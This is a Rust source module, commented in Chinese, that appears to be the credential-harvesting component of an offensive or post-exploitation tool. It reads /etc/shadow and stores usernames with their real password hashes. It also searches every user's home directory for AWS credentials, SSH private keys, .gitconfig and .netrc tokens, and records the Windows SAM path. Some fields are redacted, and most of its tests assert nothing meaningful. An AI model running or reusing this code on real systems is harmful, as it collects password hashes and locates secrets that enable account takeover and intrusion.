//! 凭据收集模块
//!
//! 收集密码哈希、令牌、SSH 密钥、API 密钥等凭据信息

use serde::{Deserialize, Serialize};
use std::path::Path;
use walkdir::WalkDir;

/// 凭据收集器
pub struct CredentialCollector;

impl CredentialCollector {
    /// 创建新的凭据收集器
    pub fn new() -> Self {
        Self
    }

    /// 收集密码哈希
    pub fn collect_password_hashes(&self) -> Vec<HashEntry> {
        let mut hashes = Vec::new();

        // Windows SAM 文件路径
        #[cfg(windows)]
        hashes.extend(self.collect_windows_hashes());

        // Linux shadow 文件
        #[cfg(unix)]
        hashes.extend(self.collect_unix_hashes());

        hashes
    }

    /// 收集令牌
    pub fn collect_tokens(&self) -> Vec<Token> {
        let mut tokens = Vec::new();

        // 搜索可能包含令牌的文件
        let token_paths = vec![
            "/root/.aws/credentials",
            "/home/*/.aws/credentials",
            "C:\\Users\\*\\.aws\\credentials",
        ];

        for pattern in token_paths {
            if let Ok(paths) = glob::glob(pattern) {
                for path in paths.filter_map(|p| p.ok()) {
                    if let Ok(content) = std::fs::read_to_string(&path) {
                        if content.contains("aws_access_key_id") || content.contains("aws_secret_access_key") {
                            tokens.push(Token {
                                token_type: "AWS".to_string(),
                                location: path.to_string_lossy().to_string(),
                                content: "[REDACTED]".to_string(),
                            });
                        }
                    }
                }
            }
        }

        tokens
    }

    /// 收集 SSH 密钥
    pub fn collect_ssh_keys(&self) -> Vec<SshKey> {
        let mut keys = Vec::new();

        // 搜索 SSH 密钥
        let key_patterns = vec![
            "/root/.ssh/id_*",
            "/home/*/.ssh/id_*",
            "C:\\Users\\*\\.ssh\\id_*",
        ];

        for pattern in key_patterns {
            if let Ok(paths) = glob::glob(pattern) {
                for path in paths.filter_map(|p| p.ok()) {
                    if let Ok(metadata) = std::fs::metadata(&path) {
                        if metadata.is_file() {
                            let filename = path.file_name().unwrap_or_default().to_string_lossy().to_string();
                            if !filename.ends_with(".pub") {
                                keys.push(SshKey {
                                    key_type: self.detect_key_type(&filename),
                                    path: path.to_string_lossy().to_string(),
                                    fingerprint: None, // 需要实际读取文件计算
                                });
                            }
                        }
                    }
                }
            }
        }

        keys
    }

    /// 收集 API 密钥
    pub fn collect_api_keys(&self) -> Vec<ApiKey> {
        let mut keys = Vec::new();

        // 搜索可能包含 API 密钥的文件
        let search_patterns = vec![
            // GitHub/GitLab
            "/home/*/.gitconfig",
            "C:\\Users\\*\\.gitconfig",
            // 各种配置文件
            "/home/*/.netrc",
            "C:\\Users\\*\\.netrc",
        ];

        for pattern in search_patterns {
            if let Ok(paths) = glob::glob(pattern) {
                for path in paths.filter_map(|p| p.ok()) {
                    if let Ok(content) = std::fs::read_to_string(&path) {
                        // 检测 GitHub token
                        if content.contains("github") && (content.contains("oauth") || content.contains("token")) {
                            keys.push(ApiKey {
                                service: "GitHub".to_string(),
                                location: path.to_string_lossy().to_string(),
                                redacted: true,
                            });
                        }
                        // 检测 AWS keys
                        if content.contains("AKIA") {
                            keys.push(ApiKey {
                                service: "AWS".to_string(),
                                location: path.to_string_lossy().to_string(),
                                redacted: true,
                            });
                        }
                    }
                }
            }
        }

        keys
    }

    /// Windows: 收集 Windows 密码哈希
    #[cfg(windows)]
    fn collect_windows_hashes(&self) -> Vec<HashEntry> {
        let mut hashes = Vec::new();

        // 添加 SAM 文件路径（需要管理员权限访问）
        hashes.push(HashEntry {
            hash_type: "SAM".to_string(),
            location: "C:\\Windows\\System32\\config\\SAM".to_string(),
            username: "[SYSTEM]".to_string(),
            hash: "[REDACTED - Requires Admin Access]".to_string(),
        });

        hashes
    }

    /// Unix: 收集 Unix 密码哈希
    #[cfg(unix)]
    fn collect_unix_hashes(&self) -> Vec<HashEntry> {
        let mut hashes = Vec::new();

        // 尝试读取 /etc/shadow（需要 root 权限）
        if let Ok(content) = std::fs::read_to_string("/etc/shadow") {
            for line in content.lines() {
                if line.starts_with('#') || line.is_empty() {
                    continue;
                }

                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() >= 3 {
                    hashes.push(HashEntry {
                        hash_type: "shadow".to_string(),
                        location: "/etc/shadow".to_string(),
                        username: parts[0].to_string(),
                        hash: if parts[1] != "" && parts[1] != "x" && parts[1] != "*" {
                            format!("{}:{}", parts[0], parts[1])
                        } else {
                            "[LOCKED]".to_string()
                        },
                    });
                }
            }
        }

        hashes
    }

    /// 检测 SSH 密钥类型
    fn detect_key_type(&self, filename: &str) -> String {
        if filename.contains("rsa") {
            "RSA".to_string()
        } else if filename.contains("ed25519") {
            "Ed25519".to_string()
        } else if filename.contains("ecdsa") {
            "ECDSA".to_string()
        } else if filename.contains("dsa") {
            "DSA".to_string()
        } else {
            "Unknown".to_string()
        }
    }
}

impl Default for CredentialCollector {
    fn default() -> Self {
        Self::new()
    }
}

// ==================== 数据结构 ====================

/// 密码哈希条目
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HashEntry {
    pub hash_type: String,
    pub location: String,
    pub username: String,
    pub hash: String,
}

/// 令牌信息
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Token {
    pub token_type: String,
    pub location: String,
    pub content: String,
}

/// SSH 密钥
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SshKey {
    pub key_type: String,
    pub path: String,
    pub fingerprint: Option<String>,
}

/// API 密钥
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApiKey {
    pub service: String,
    pub location: String,
    pub redacted: bool,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_credential_collector_creation() {
        let collector = CredentialCollector::new();
        // 验证对象创建成功
        assert!(true);
    }

    #[test]
    fn test_collect_password_hashes() {
        let collector = CredentialCollector::new();
        let hashes = collector.collect_password_hashes();
        // 不应该崩溃
        assert!(true);
    }

    #[test]
    fn test_collect_tokens() {
        let collector = CredentialCollector::new();
        let tokens = collector.collect_tokens();
        // 不应该崩溃
        assert!(true);
    }

    #[test]
    fn test_collect_ssh_keys() {
        let collector = CredentialCollector::new();
        let keys = collector.collect_ssh_keys();
        // 不应该崩溃
        assert!(true);
    }

    #[test]
    fn test_collect_api_keys() {
        let collector = CredentialCollector::new();
        let keys = collector.collect_api_keys();
        // 不应该崩溃
        assert!(true);
    }

    #[test]
    fn test_detect_key_type() {
        let collector = CredentialCollector::new();
        assert_eq!(collector.detect_key_type("id_rsa"), "RSA");
        assert_eq!(collector.detect_key_type("id_ed25519"), "Ed25519");
        assert_eq!(collector.detect_key_type("id_ecdsa"), "ECDSA");
        assert_eq!(collector.detect_key_type("id_dsa"), "DSA");
        assert_eq!(collector.detect_key_type("id_unknown"), "Unknown");
    }
}
